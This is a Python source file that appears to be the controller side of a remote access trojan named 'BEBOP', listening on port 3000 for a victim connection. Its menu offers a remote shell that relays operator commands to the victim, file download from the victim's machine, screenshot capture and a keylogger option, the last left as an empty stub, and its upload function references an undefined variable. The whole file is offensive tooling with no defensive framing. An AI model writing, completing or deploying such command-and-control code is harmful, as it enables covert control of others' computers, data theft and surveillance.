import socket
import sys
import threading
import time
import os

def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) Exit\n\n")

def establish_connection():
    global conn_to_client, server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 3000))
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()

    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")
    else:
        sys.exit("Failed to recieve connection to client...Exiting")



def recv(buff_size=1024):
    data_size = int(conn_to_client.recv(12).decode())

    data = bytes()
    while len(data) < data_size:
        data += conn_to_client.recv(buff_size)

    return data


def send(data):
    header_size = 12
    data_size = f"{len(data):^{header_size}}"
    conn_to_client.send(data_size.encode())
    conn_to_client.sendall(data)



def open_shell():
    while True:
        cmd = input("bebop#: ")
        
        if cmd == "exit":
            send(cmd.encode())
            break
        elif cmd[:2] == "dw":
            #Download
            print("Downloading...")
            send(cmd.encode())
            file_name = cmd[3:].split(os.path.sep).pop()
            download_file(file_name)
            continue
            
        elif cmd[:2] == "up":
            #Upload
            print("Uploading...")
            continue

        send(cmd.encode())
        output = recv()
        print(output.decode())

def download_file(file_name, file_path=os.getcwd()):
    file_data = recv()
    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
    file.write(file_data)
    file.close()

def upload_file():
    file_name = file_path.split(os.path.sep).pop()
    send(file_name.encode())

    print("\nUploading File...", end="")
    file = open(file_path, "rb")
    buffer = file.read()
    file.close()

    send(buffer)
    print("Done!\n")

def main():
    establish_connection()
    while True:
        print_menu()
        choice = input("Enter Choice: ")
        send(choice.encode())

        if choice == "1":
            open_shell()

        elif choice == "2":
            download_file(file_name=f"{time.asctime()}.png")

        elif choice == "3":
            pass

        elif choice == "4":
            conn_to_client.shutdown(socket.SHUT_WR)
            conn_to_client.close()
            sys.exit()

main()
